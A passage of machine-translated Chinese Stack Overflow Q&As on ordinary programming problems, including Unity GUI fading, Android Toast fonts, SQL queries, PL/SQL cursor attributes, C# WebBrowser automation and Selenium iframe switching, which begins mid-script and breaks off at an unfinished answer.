    //background image dimensions, note: this gets dimensions of unscaled image
    var img = new Image;
    img.src = $(this).css('background-image').replace(/url\(|\)$/ig, "");
    var background = {w: img.width, h: img.height};

    //background ratio
    var backgroundRatio = background.h / background.w;

    //max x and y position, aka boundary
    var min = {x: 0, y: 0};
    var max = {x: 0, y: 0};

    //move x
    if(backgroundRatio < containerRatio){
        min.y = 0;
        min.x = -((container.h * (1/backgroundRatio)) - container.w);
    }

    //move y
    else if (backgroundRatio > containerRatio){
        min.x = 0;
        min.y = -((container.w * backgroundRatio) - container.h);
    }

    //ratios are equal, don't move anything
    else{
        min.x = 0;
        min.y = 0;
    }

    //activate
    if(e.type == 'mousedown'){

        //add border so it's easier to visualize
        $(this).css('border', '1px solid #000000');

        //get current position of mouse pointer
        origin.x = e.clientX;
        origin.y = e.clientY;

        //get current background image starting position
        var temp = $(this).css('background-position').split(" ");
        start.x = parseInt(temp[0]);
        start.y = parseInt(temp[1]);

        //mouse is dragged while mousedown
        $(this).mousemove(function(e){

            //move position
            move.x = start.x + (e.clientX - origin.x);
            move.y = start.y + (e.clientY - origin.y);

            //if it's in the bounds, move it
            if(move.x <= max.x && move.x >= min.x && move.y <= max.y && move.y >= min.y){

                console.log('both');

                //alter css
                $(this).css('background-position', move.x + 'px ' + move.y + 'px');

                //update input
                $("#" + id).val('x:' + move.x + ', y:' + move.y);
            }

            //in x bound,
            else if(move.x <= max.x && move.x >= min.x){

                console.log('x');

                //below min.y
                if(move.y < min.y){
                    $(this).css('background-position', move.x + 'px ' + min.y + 'px');

                    //update input
                    $("#" + id).val('x:' + move.x + ', y:' + min.y);
                }
                //above max.y
                else if(move.y > max.y){
                    $(this).css('background-position', move.x + 'px ' + max.y + 'px');

                    //update input
                    $("#" + id).val('x:' + move.x + ', y:' + max.y);
                }
            }

            //in y bound
            else if(move.y <= max.y && move.y >= min.y){

                console.log('y');

                //below min.x
                if(move.x < min.x){
                    $(this).css('background-position', min.x + 'px ' + move.y + 'px');

                    //update input
                    $("#" + id).val('x:' + min.x + ', y:' + move.y);            
                }

                //above max.x
                else if(move.x > max.x){
                    $(this).css('background-position', max.x + 'px ' + move.y + 'px');

                    //update input
                    $("#" + id).val('x:' + max.x + ', y:' + move.y);
                }
            }

            //out of both bounds
            else{
                console.log('problem');
            }
        });
    }

    //deactivate
    else{

        //remove border
        $(this).css('border', 'none');

        //remove mousemove
        $(this).off('mousemove');
        $(document.body).focus();
    }
});
});
</script> 
```

# unity3d - 使用 C# 将控制器逻辑从 Unity3D GUI 控件中解耦，例如淡出 OnGUI

> ID：11271713
> 
> 赞同：2
> 
> 时间：2012-06-30T05:28:58.427
> 
> 标签：unity3d

我无法理解如何分离控制器的业务逻辑和 Unity3D GUI 控件的视图。

例如，如果我有一个`GUI.Box`，我将如何实现一个控制器来淡入或淡出`OnGUI`视图的生命周期阶段？

**看法**

```
using UnityEngine;

public class ExampleView : MonoBehaviour {

    protected void OnGUI () {
        GUI.Box(new Rect(0, 0, 100, 100), "Title");
    }

} 
```

如果我实例化一个控制器来更改它`alpha`，`GUI.color`则需要`Update()`来自主视图线程的通知。

为了粗略地封装功能，如果这是一个单独的脚本，它可以实现为：

```
using UnityEngine;

public class ExampleView : MonoBehaviour {

    private Color color;

    protected void Start () {
        color = Color.white;
    }

    protected void OnGUI () {
        GUI.color = color;
        GUI.Box(new Rect(0, 0, 100, 100), "Title");
    }

    protected void Update () {
        if(color.a > 0)
            color.a -= Time.deltaTime / 3;
    }

} 
```

类似于 iTween`iTween.fadeTo(gameObject, ...`如何使用以下语句为 Unity3d GUI 控件实现对属性的更改进行动画处理`FadeOut()`？

除非指定了多个控制器实例，否则可能无法针对单个 GUI 控件`OnGUI()`。但是，控制隔离的 GUI 实例（例如淡入淡出）会很酷，`GUI.Box`然后是`GUI.Label`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T16:27:25.883

你在寻找这样的东西吗？：

```
using UnityEngine;

public class ExampleView : MonoBehaviour {

private Color color;
private bool bFadeIn = false;
private bool bFadeOut = false;

protected void Start () {
    color = Color.white;
} 
public void FadeOut(){
    bFadeOut = true;
    bFadeIn = false;
}    
public void FadeIn(){
    bFadeIn = true;
    bFadeOut = false;
}

protected void OnGUI () {
    GUI.color = color;
    GUI.Box(new Rect(0, 0, 100, 100), "Title");
}

protected void Update () {
    if(bFadeOut && color.a > 0.0)color.a -= Time.deltaTime / 3;
    if(bFadeIn && color.a < 1.0)color.a += Time.deltaTime / 3;
}
} 
```

您可能还希望包含一个标志来确定控件何时不可见，如果不可见，则跳过完整的 GuiRender 函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-20T20:14:06.217

不知道这是否是您正在寻找的，但它是一种向 gui 添加淡入淡出效果的简单方法。

```
using UnityEngine;
using System.Collections;

/**Fade In/Out Instructions:
* 1.Create bool fadeIn. Create float alpha.
* 2.Call Fade() method at start of OnGUI().
* 3.Put 'GUI.color = new Color(1,1,1,alpha)' above the elements you want to fade'.
* 4.To fade in, fadeIn = true. 
* 5.To fade out, fadeIn = false.
* 6.To deactivate buttons on fade out, wrap gui in 'if(alpha > 0)'
**/

public class MainMenuGUI : MonoBehaviour {

    int buttonWidth;
    int buttonHeight;

    public float alpha;
    public bool fadeIn;

// Use this for initialization
void Start () {

    buttonWidth = 100;
    buttonHeight = 50;

    fadeIn = true;
}

void OnGUI(){

    Fade();

    GUI.color = new Color(1,1,1,alpha);

    if(alpha > 0)
    {
        if (GUI.Button (new Rect ((Screen.width/2)-50, (Screen.height/2)-(buttonHeight*4/2), 100, 50), "PLAY"))
        {
            fadeIn = false;
            Debug.Log("Play pressed");
        }

        if (GUI.Button (new Rect ((Screen.width/2)-50, ((Screen.height/2)-(buttonHeight*4/2)+ buttonHeight), 100, 50), "SCORES")) 
        {
            Debug.Log("Scores pressed");
        }

        if (GUI.Button (new Rect ((Screen.width/2)-50, ((Screen.height/2)-(buttonHeight*4/2)+ buttonHeight*2), 100, 50), "OPTIONS")) 
        {
            Debug.Log("Options pressed");
        }

        if (GUI.Button (new Rect ((Screen.width/2)-50, ((Screen.height/2)-(buttonHeight*4/2)+ buttonHeight*3), 100, 50), "EXIT")) 
        {
            Debug.Log("Exit pressed");
        }
    }
}

void Fade(){
    if(fadeIn){
        alpha = Mathf.Clamp(alpha+0.01f,0,1);
    }else{
        alpha = Mathf.Clamp(alpha-0.01f,0,1);   
    }
}

} 
```

祝你游戏好运:)

# android - 无法从 Eclipse 到设备直接调试 android 应用程序

> ID：11271716
> 
> 赞同：1
> 
> 时间：2012-06-30T05:29:47.093
> 
> 标签：android, android-layout, android-emulator, android-widget

我有一个疑问，我已经在 eclipse 中使用 android 2.3.1 创建了新项目，并尝试直接从 eclipse 调试到 device.and 它工作得很好，它在 device.now 当我将该版本的 android 2.3.1 转换为GoogleApi 2.3.1 通过右键单击项目并更改 android 属性。之后，当我运行我的项目时，我得到了如下图所示的那种令人讨厌的符号。

![http://i.stack.imgur.com/FsEKV.png](../Images/14bc86523af3f8fdbd03dcdd0fe5466a.png)

当我将版本更改为简单的 android 2.3.1 时，它再次从 eclipse 调试到设备。

我的设备名称是 Sony Ericon Walk Man Live，当我将 apk 直接复制到 sd 卡并安装在设备中时，还有另一件事 Google API 版本运行良好，但只有当我直接从 eclipse 运行到设备时才会出现问题。

我注意到的另一件事是，当我创建一个简单的项目而不是右键单击项目并运行它时，它要求我是否在设备或模拟器中运行，但在较旧的项目中，它甚至没有询问并直接在模拟器中运行......在两个项目清单中也没有像 android:debuggable="true/false" 这样的标签...

任何人都知道这个问题的解决方案是什么，我已经将设备驱动程序安装到 pc 上。

请帮我缩短这个

在此先感谢 Aamirkhan I。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:43:09.550

启用 USB 调试是关键，但还有其他内容。默认情况下，Eclipse 在第一次运行后自动运行您的应用程序。因此，如果您选择模拟器作为您的第一次运行，Eclipse 将默认在之后每次运行时都由模拟器运行。要更改此设置，请转到“运行配置”。![在此处输入图像描述](../Images/716c55db907cf78d021eaf6015e5abca.png)

将有一个选项可以手动或自动运行。![在此处输入图像描述](../Images/358889e88cbb3622f716d79228d69dc1.png)

选择“手动”，每次您决定运行时，系统都会提示您在模拟器和设备之间进行选择。否则，您可以设置是否使用您的设备或模拟器自动运行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:36:34.117

试试这个[链接](http://maketecheasier.com/activate-usb-debug-on-android-device/2011/04/06)

如果您已经通过 USB 数据线将移动设备与计算机连接，请将其从手机上拔下，否则您的设备会提示您要求这样做的警告。

![在此处输入图像描述](../Images/1a58716da3b9efedd2aa8265304d8ba4.png)

# wordpress - 如何以编程方式注册 MS Word 博客帐户

> ID：11271719
> 
> 赞同：1
> 
> 时间：2012-06-30T05:30:09.620
> 
> 标签：wordpress, ms-word, vsto

在不扭曲格式的情况下将 Word 文档导入 WordPress 的唯一方法似乎是通过博客文章模板。相信我，我已经尝试了很多其他方法，使用 htmltidy、htmlawed 和其他代码来清理 Word 生成的 HTML 页面。
![在此处输入图像描述](../Images/866d796c0f272890f6f8d49a6ff32c5e.png)

为此，您需要注册一个新的 WordPress 帐户。 ![在此处输入图像描述](../Images/8d86079cdb1c3dcff5294c4d5b437d0c.png)

对我来说不幸的是，我的用户缺乏自己填写此内容的心理能力。假设我已经有了博客 url、用户名和密码，如何通过 VBA 或 C# VSTO AddIn 以编程方式为用户注册博客帐户？

# ruby-on-rails - 用黄瓜和水豚测试 Rails 应用程序将无法识别 current_path.should == new_session_path

> ID：11271720
> 
> 赞同：0
> 
> 时间：2012-06-30T05:30:14.420
> 
> 标签：ruby-on-rails, cucumber, capybara

我正在尝试对预期路径做出简单的断言。

在我的步骤定义文件中，根据 capybara 文档：

```
Then /^I should be on the login page/ do
  current_path.should == new_session_path
end 
```

这返回

```
undefined method `new_session_path' for #<Cucumber::Rails::World:0x0000010340b4c0> (NoMethodError) 
```

看起来好像它没有加载路线助手..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T00:57:41.483

这是一个脑子放屁的问题。对此真的很抱歉。很长一段时间以来我一直没有意识到的一个细节是我遇到了 Rails 的引擎隔离问题。具体来说，我正在测试refinerycms 并遇到了这里描述的问题：[https ://github.com/resolve/refinerycms/issues/1259](https://github.com/resolve/refinerycms/issues/1259)

所以修复它很简单：

```
current_path.should == refinery.admin_root_path 
```

# android - 如何设置吐司的字体？

> ID：11271721
> 
> 赞同：6
> 
> 时间：2012-06-30T05:30:15.597
> 
> 标签：android, toast

我可以像这样为我的文本视图设置自定义字体

```
Typeface typeface = Typeface.createFromAsset(context.getAssets(),"fonts/akshar.ttf");
setTypeface(typeface); 
```

如何将相同的内容设置为默认 Toast，以便能够在 Toast 消息中呈现我的语言环境文本。我可以设置重力、持续时间但不能设置字体。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T05:32:30.633

您可以将自定义 Toast 创建为：

```
 LayoutInflater inflater = getLayoutInflater();
    View layout = inflater.inflate(R.layout.toast_layout,
                                   (ViewGroup) findViewById(R.id.toast_layout_root));

    TextView text = (TextView) layout.findViewById(R.id.text);
    text.setText("Hello! This is a custom toast!");
    Typeface typeface = Typeface.createFromAsset(context.getAssets(),"fonts/akshar.ttf");
    text.setTypeface(typeface);
    Toast toast = new Toast(getApplicationContext());
    toast.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
    toast.setDuration(Toast.LENGTH_LONG);
    toast.setView(layout);

toast.show(); 
```

有关我们如何创建自定义 Toast 的更多详细信息，请参阅[CustomToastView](http://developer.android.com/guide/topics/ui/notifiers/toasts.html#CustomToastView)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T05:32:42.413

Toast 有一个方法[setView()](http://developer.android.com/reference/android/widget/Toast.html#setView%28android.view.View%29)，因此您可以设置 TextView 的字体并将相同的 TextView 添加到 Toast 使用

```
toast.setView(textview); 
```

# java - 100% 准确的 key,value HashMap

> ID：11271722
> 
> 赞同：1
> 
> 时间：2012-06-30T05:30:17.920
> 
> 标签：java, hashmap, key-value

根据网页[http://www.javamex.com/tutorials/collections/hash_codes_advanced.shtml](http://www.javamex.com/tutorials/collections/hash_codes_advanced.shtml)

> 哈希码不能唯一标识一个对象。它们只是缩小了匹配项的选择范围，但预计在正常使用中，多个对象很有可能共享相同的哈希码。因此，当在映射或集合中查找键时，必须比较实际键对象的字段以确认匹配。”

首先，这是否意味着 has 映射中使用的键也可能指向一个以上的值？我认为确实如此。

如果是这种情况。如何创建“始终准确”的哈希图或类似的键值对象？

我的键需要是字符串，我的值也需要是字符串。我需要大约 4,000 到 10,000 个键值对。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:32:55.807

一个标准的 hashmap 将保证唯一的键。哈希码不等同于密钥。这只是一种将可能值集快速减少为具有特定哈希码的对象（在您的情况下为字符串）的方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:39:38.923

首先，请注意：Java 的 HashMaps 工作。假设哈希函数被正确实现，对于同一个键，你总是会得到相同的值。

现在，在哈希映射中，键的哈希码决定了值将被放置在哪个桶中（如果您不熟悉该术语，请阅读哈希表）。映射的性能取决于哈希码的分布情况，以及每个桶中值的数量的平衡程度。既然你正在使用`String`，请放心。HashMap 将“始终准确”。

# c# - 保存服务器日期和时间

> ID：11271727
> 
> 赞同：2
> 
> 时间：2012-06-30T05:32:00.233
> 
> 标签：c#, asp.net, .net, asp.net-mvc

我想在我的新闻中保存时间和日期，但在下面的方法中我保存了用户的时间，如果他/她的时间错误，错误的时间将被保存。我怎样才能使用服务器的时间。

```
SqlConnection sqlconn = new SqlConnection(connStr);
SqlCommand sqlcmd = new SqlCommand("insert into SubmitManuscript(username,title,authors,type,date,upload,reviewer1,email1,reviewer2,email2,reviewer3,email3)values(@username,@title,@authors,@type,@date,@upload,@reviewer1,@email1,@reviewer2,@email2,@reviewer3,@email3)", sqlconn);
sqlcmd.Parameters.AddWithValue("@username", username);
sqlcmd.Parameters.AddWithValue("@title", Text_Title.Text);
sqlcmd.Parameters.AddWithValue("@authors", Text_Author.Text);
sqlcmd.Parameters.AddWithValue("@type", dd_Type.SelectedItem.Text);
sqlcmd.Parameters.AddWithValue("@date", DateTime.Now);
//sqlcmd.Parameters.AddWithValue("@upload", "~/Suppelment/" + 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T06:58:55.920

**无需传递 datetime**参数。只需在数据库中的表中将日期时间设置为默认值。这应该够了吧。

这是一个如何在表生成脚本中设置的链接：

[如何设置日期时间列的默认值](http://social.msdn.microsoft.com/Forums/en/sqlce/thread/acabe35a-7365-4258-b3da-4e42081eb1a2)

**编辑：**您的表需要有一个特殊的 DateTimeStamp 列，该列将在您插入记录时自动设置系统日期时间。我正在放置一个简单的脚本，您可以将其用作示例。

**注意：**如果您已经有表格，那么只需从脚本开始`ALTER TABLE`

```
CREATE TABLE [dbo].[Employee]
(
    [EmployeeId] [int] IDENTITY(1,1) NOT NULL,
    [Name] [varchar](50) NULL,
    [BirthDate] [datetime] NOT NULL,
    [LastUpdateTime] [datetime] NOT NULL,

    CONSTRAINT [PK_Employee] 
        PRIMARY KEY CLUSTERED ([EmployeeId] ASC)
                    WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, 
                          IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, 
                          ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]
GO

SET ANSI_PADDING OFF
GO

ALTER TABLE [dbo].[Employee] 
    ADD CONSTRAINT [DF_Employee_LastUpdateTime]  
        DEFAULT (getdate()) FOR [LastUpdateTime]
GO

--- You may also use multiple record insert statement in SQL Server 2008
--- however, I will use a traditional approach here
INSERT INTO [dbo].[Employee] (Name, BirthDate)
VALUES ('Smith', '04/14/1979')

INSERT INTO [dbo].[Employee] (Name, BirthDate)
VALUES ('Jhone', '11/08/1983')
GO 
```

# sql - 查找没有孩子的一对多的父母

> ID：11271732
> 
> 赞同：0
> 
> 时间：2012-06-30T05:32:46.750
> 
> 标签：sql, one-to-many

假设我有下面的两个表格，我如何找到所有没有 (0) 答案的问题？

```
question
---------
id
content 
```

和

```
answer
------
id
question_id
content 
```

IE，`question 1->* answers`

- 编辑 -

要添加到我的问题，我将如何检索每个问题的答案计数？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:36:17.923

```
select * from question q where not exists (select 1 from answer a where a.question_id=q.id) 
```

回答已编辑的问题：

```
select q.id, content, count(a.id)
  from question q
  left outer join answer a
    on q.id = a.question_id
 group by q.id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:37:18.913

您可以使用以下查询找到。

```
Select * from question where id not in (Select question_id from answer) 
```

# c# - 如何单击 webbrowser 控件中的按钮？

> ID：11271737
> 
> 赞同：17
> 
> 时间：2012-06-30T05:33:18.310
> 
> 标签：c#, button, browser

例如，使用代码并且没有用户输入，我将如何让我的程序点击 google 上的“搜索”按钮（假设我已经填写了搜索框并且在 google.com）

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-06-30T09:54:49.633

```
webBrowser1.Navigate("http://www.google.com"); 
```

**如果你有这个`ID`用途：**

```
webBrowser1.Document.GetElementById("id").InvokeMember("click"); 
```

**如果你`TagName`用过这个**

```
 webBrowser1.Navigate("http://www.google.com"); 
```

在 Web 浏览器 DocumentCompleted 事件中

```
HtmlElement textElement = webBrowser1.Document.All.GetElementsByName("q")[0];
textElement.SetAttribute("value", "your text to search");
HtmlElement btnElement = webBrowser1.Document.All.GetElementsByName("btnG")[0];
btnElement.InvokeMember("click"); 
```

**如果你有名字`Class`使用这个：**

```
HtmlElementCollection classButton = webBrowser1.Document.All;
foreach (HtmlElement element in classButton) 
{
    if (element.GetAttribute("className") == "button")
    {
        element.InvokeMember("click");
    }
} 
```

要在 a 中添加文本`TextBox`以搜索 google.com，请使用以下命令：

```
 webBrowser1.Document.GetElementById("gs_tti0").InnerText = "hello world"; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-23T19:35:55.380

试试下面的代码：

```
public WebBrowser webBrowser1 = new WebBrowser();
    private void WebForm_Load(object sender, EventArgs e)
        {
            try
            {
                webBrowser1.Height = 1000;
                webBrowser1.Width = 1000;
                this.Controls.Add(webBrowser1);
                webBrowser1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(WebBrowser_DocumentCompleted);
                this.webBrowser1.Navigate("www.google.com.au");
            }
            catch
            { } 
```

在您的 c# 表单中写下以下函数：

```
public void WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
    {
        var webBrowser = sender as WebBrowser;
        webBrowser.DocumentCompleted -= WebBrowser_DocumentCompleted;

        HtmlElement textElement = webBrowser.Document.All.GetElementsByName("q")[0];
        textElement.SetAttribute("value", "mlm company");
        HtmlElement btnElement = webBrowser.Document.All.GetElementsByName("btnG")[0];
        btnElement.InvokeMember("click");

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-03T22:24:46.913

除了 using`InvokeMember`和其他，如果您的网页在被`ID`or调用时出现响应问题`Class`，您可以尝试在 .NET 中使用`{TAB}`&`{ENTER}`使用该类。`SendKeys`我已经为网页编写了很多脚本，并且发现我必须将两者结合使用（尽管`SendKeys`比@AleWin 的答案中的方法要混乱得多）。

[这是 SendKeys 类的链接。](https://msdn.microsoft.com/en-us/library/system.windows.forms.sendkeys(v=vs.110).aspx "SendKeys 类 - MSDN")

# sql - cusor 属性中 %NOTFOUND 的默认值是多少？

> ID：11271739
> 
> 赞同：1
> 
> 时间：2012-06-30T05:33:44.507
> 
> 标签：sql, plsql, attributes, cursor

我正在研究 PL/SQL 游标。我的光标属性有问题。在隐式和显式游标中`%FOUND`，默认值是多少？`%NOTFOUND`

我正在浏览我发现这句话的PDF

```
LOOP
FETCH c1 INTO my_ename, my_sal, my_hiredate;
EXIT WHEN c1%NOTFOUND;
...
END LOOP; 
```

**在第一次提取之前，%NOTFOUND 的计算结果为 NULL。**因此，如果 FETCH 从未成功执行，则永远不会退出循环。这是因为 EXIT WHEN 语句仅在其 WHEN 条件为真时执行。为了安全起见，请改用以下 EXIT 语句：

```
EXIT WHEN c1%NOTFOUND OR c1%NOTFOUND IS NULL; 
```

如果游标未打开，则使用`%NOTFOUND`raises引用它`INVALID_CURSOR`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T09:56:19.527

在回答您的问题时，没有“默认”值。`%NOTFOUND`是在打开游标时实例化的“变量”。那时的值为空；我想如果你愿意的话，你可以把它称为默认值。在第一次获取游标后，该值将是 true 还是 false，具体取决于是否返回了任何行。光标关闭后，“变量”不再存在。

引用[11gr2 文档](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/static.htm#LNPLS546)：

> %NOTFOUND（与 %FOUND 的逻辑相反）返回：
> NULL 在打开显式游标之后但在第一次获取之前
> FALSE 如果从显式游标的最新获取返回一行 返回
> TRUE 否则

10g 文档有一个有用的[表格来说明这一点](http://docs.oracle.com/cd/B19306_01/appdev.102/b14261/sqloperations.htm#LNPLS00603)

```
+----------------+--------+--------------+
| 舞台 | 什么时候 | 返回值 |
+----------------+--------+--------------+
| 开放| 之前 | 例外 |
| | 之后 | 空 |
| 第一次提取 | 之前 | 空 |
| | 之后 | 假 |
| 下一次提取 | 之前 | 假 |
| | 之后 | 假 |
| 最后一次取货 | 之前 | 假 |
| | 之后 | 真实 |
| 关闭 | 之前 | 真实 |
| | 之后 | 例外 |
+----------------+--------+--------------+
```

但是，Oracle 文档中似乎存在直接的矛盾。11g 文档也有类似于您所描述的内容。其措辞似乎与上述断言直接矛盾

> 注意：在示例 6-16 中，如果 FETCH 从不获取行，则 c1%NOTFOUND 始终为 NULL，并且永远不会退出循环。为防止无限循环，请改用此 EXIT 语句：EXIT WHEN c1%NOTFOUND OR (c1%NOTFOUND IS NULL);

[10g 文档](http://docs.oracle.com/cd/B19306_01/appdev.102/b14261/cursor_attributes.htm#LNPLS01311)更加明确并且措辞略有不同。这不是直接矛盾

> 在第一次提取之前，%NOTFOUND 的计算结果为 NULL。如果 FETCH 从未成功执行，则 EXIT WHEN 条件永远不会为 TRUE，并且循环永远不会退出。为了安全起见，您可能希望改用以下 EXIT 语句：
> 
> 当 c1%NOTFOUND 或 c1%NOTFOUND 为空时退出；

一般来说，我会说信任文档并编写`EXIT WHEN c1%NOTFOUND OR c1%NOTFOUND IS NULL`.

我不知道在什么情况下 fetch 不会成功执行；[我问过这个问题](https://stackoverflow.com/questions/11273185/why-might-a-fetch-not-execute-successfully)。如果由于锁定等原因 fetch 永远不会返回值，那么您将永远无法到达代码的一部分来确定它是否失败。

[René Nyffenegger](http://www.adp-gmbh.ch/ora/plsql/cursors/attributes.html)在他的博客上有一些代码很好地解释了它的`%NOTFOUND`工作原理。

# wpf - WPF 扩展器标题鼠标悬停颜色更改

> ID：11271745
> 
> 赞同：-1
> 
> 时间：2012-06-30T05:35:17.060
> 
> 标签：wpf, header, mouseover, expander

我有 wpf Expander 控件，当我将鼠标悬停在上面时，我想更改 Header 的背景颜色。这是我的控制：

```
<Expander Margin="0" ExpandDirection="Right">
    <Expander.Header>
        <StackPanel Orientation="Horizontal" VerticalAlignment="Top">
            <Image Source="placeholder_imageObject.png"  Stretch="Uniform" Margin="6,0,0,0" Width="36" Height="36" VerticalAlignment="Center"/>
            <ContentPresenter Content="Image" VerticalAlignment="Center" Margin="5,0,0,0"/>
            <Path Data="{StaticResource RightArrowGeometry}" Fill="Black"  Margin="14,0,0,0" VerticalAlignment="Center">
            </Path>
        </StackPanel>
    </Expander.Header>
    <Grid Margin="10,0,0,0" Background="White">
        <controls:SymbolController x:Name="dgSymbolControl">
        </controls:SymbolController>
    </Grid>
</Expander> 
```

请帮助感谢赛

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:52:13.780

你可以在你的“Expander.Header”中给你的 StackPanel 一个带有触发器的样式，如下所示：

```
 <Style x:Key="MyCustomStackPanelStyle" TargetType="{x:Type StackPanel}">
      <Style.Triggers>
        <Trigger Property="IsMouseOver" Value="True">
          <Setter Property="Background" Value="Red" />
        </Trigger>
        <Trigger Property="IsMouseOver" Value="False">
          <Setter Property="Background" Value="Transparent" />
        </Trigger>
      </Style.Triggers>
    </Style> 
```

# google-apps-script - 提高我的脚本运行时间

> ID：11271746
> 
> 赞同：1
> 
> 时间：2012-06-30T05:35:39.727
> 
> 标签：google-apps-script, google-sites

有没有办法改善我的脚本运行时间？我有一个创建 2 个列表框的脚本：`Listbox1`项目是我所有的谷歌网站页面，`listbox2`项目是页面的子`listbox1`页面。该脚本运行良好，但有时需要 2 到 5 秒才能获取所有`listbox2`项目。

[你可以在这里](https://sites.google.com/site/phichdaica/)试试我的脚本。

这是我的脚本：

```
function doGet() 
{
  var app = UiApp.createApplication();
  //GUI with 2 listbox
  //Listbox1: onclick > lbox1onclick(e), onchange > lbox1onchange(e)
  app.add(app.loadComponent("MyUrlParser")); 
  var lbox1 = app.getElementById('ListBox1');
  lbox1.addItem(' ');
  var lbox1_Item = SitesApp.getSite('phichdaica').getChildByName('manga').getChildren();
  for(var i = lbox1_Item.length-1; i >= 0; i--)
  {
      lbox1.addItem(lbox1_Item[i].getTitle());
  }
  return app;  

}

function lbox1onclick(e)
{
  var app = UiApp.getActiveApplication();
  var lbox2 = app.getElementById('ListBox2');
  lbox2.clear();
  return app;
}

function lbox1onchange(e)
{
  var app = UiApp.getActiveApplication();
  // var value = e.parameter.lbox1;
  var lbox1value = e.parameter.ListBox1;
  var lbox2 = app.getElementById('ListBox2');

  var lbox2_Item = SitesApp.getSite('phichdaica').getChildByName('manga').getChildByName(lbox1value).getChildren();

  for(var i=lbox2_Item.length-1; i >= 0; i--)
  {
    lbox2.addItem(lbox2_Item[i].getTitle());
  }
  return app;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T08:44:19.073

我不认为它会加速这个过程，但你可以只使用一个处理函数来做到这一点：在更改 listBox1 时，清除 listBox 2 并立即重新填充它。需要一些时间的是对网站内容的调用，因此差异可能并不显着，但脚本的“逻辑”会得到改进；-)

查看您的页面，我发现 listBox 2 从未被清除...这是一个临时问题吗？你最近有改变吗？

此外，当在 listBox2 中选择某些内容时应该发生什么？

***编辑***：根据您的评论，如果您想改善有关 UI 的“响应性”的用户体验，最好的方法是使用客户端处理程序来触发“*等待消息*”的可见性（例如“*更新列表*”） . 我通常使用通过客户端处理程序使其可见的动画 gif，并且在服务器处理程序返回时再次使其不可见（即我在服务器处理程序函数中将其设置为不可见）。

这是一个[工作示例](https://docs.google.com/macros/exec?service=AKfycbyc2SWv6JhDgUpXwF7aAARihIE7WPRmrQf6KIOtfQ)，只需尝试更改右上角的日期即可。

# ruby - 为什么 IO#lineno 并不总是指示 IO#read 的下一个读取点

> ID：11271752
> 
> 赞同：0
> 
> 时间：2012-06-30T05:36:43.493
> 
> 标签：ruby, io

```
f= File.open('path_to_file','w')

f.lineno
#=> 0

f.gets
#=>"this is the content of the first line"

f.lineno

#=>1 # the lineno cooresponse to the next read point of IO#gets

f.rewind

f.lineno

#=>0

f.read

#=>"all the content in the file"

f.lineno

#=>0 # the lineno still is the beginning 

f.read 

#=>"" # but I can't get anyting , it seems like the read point reach to the end of the file, so the f.lineno should be 3, instead of 0 
```

或者有没有其他方法可以知道IO流的下一个读取点

```
f.lineno

#=>0 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:46:35.703

从[Ruby IO docs](http://www.ruby-doc.org/core-1.9.3/IO.html)中，`lineno`不会告诉您在流中的位置。相反，它告诉您 get 被调用了多少次。由于`read`函数不使用`gets`，`lineno`值不会改变。

您可能想要的是`pos`，它以字节为单位告诉您文件中的当前偏移量。您还可以设置`pos`跳转到文件中的不同位置。

# iframe - 如何从 iframe 返回到主页以处理主页元素 - 使用 selenium webdriver

> ID：11271755
> 
> 赞同：12
> 
> 时间：2012-06-30T05:37:03.557
> 
> 标签：iframe, selenium, webdriver

我曾经`Driver.switchTo().frame("XXXXX");` 在主页上访问 iframe

现在我想回到主页使用 selenium webdriver 进行其他操作

我曾试图获得窗户把手

但我无法获得 iFrame 窗口句柄

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-06-30T16:33:30.597

```
driver.switchTo().defaultContent(); 
```

# iphone - iOS 聊天 APNS、套接字或时间间隔

> ID：11271758
> 
> 赞同：23
> 
> 时间：2012-06-30T05:37:34.863
> 
> 标签：iphone, ios, sockets, chat, apple-push-notifications

我正在为 iPhone 制作一个聊天应用程序，但我不确定对话消息应该如何立即发送。

我已经阅读了大量关于这个主题的谷歌搜索结果。还有一次：
- [http://www.raywenderlich.com/3932/how-to-create-a-socket-based-iphone-app-and-server](http://www.raywenderlich.com/3932/how-to-create-a-socket-based-iphone-app-and-server)
- [http://www.raywenderlich.com/3443/苹果推送通知服务教程第 12 部分](http://www.raywenderlich.com/3443/apple-push-notification-services-tutorial-part-12)

**APNS 方法：**
将向 iPhone 推送一条不可见的通知，指示有新消息可供阅读。因此，该应用程序将请求未读消息。因此，我不会手动轮询新消息，而是让 APNS 提供帮助。但我不确定？

**套接字方法：**
建立一个开放的套接字连接以共享数据。当在 db 中发现新消息时，它会自动将数据发送到应用程序。但是 IP 范围、防火墙、功耗和其他东西呢？我又不确定:(

**轮询方法：**
在我轮询请求的时间间隔，功耗是我的敌人。

**我的问题：**
- 哪种方法最好？
- 其他建议？
- 我真的需要一些在这个话题上有经验的人的缺点和优点。

例子总是好的。
谢谢

* * *

## 回答 #1

> 赞同：6
> 
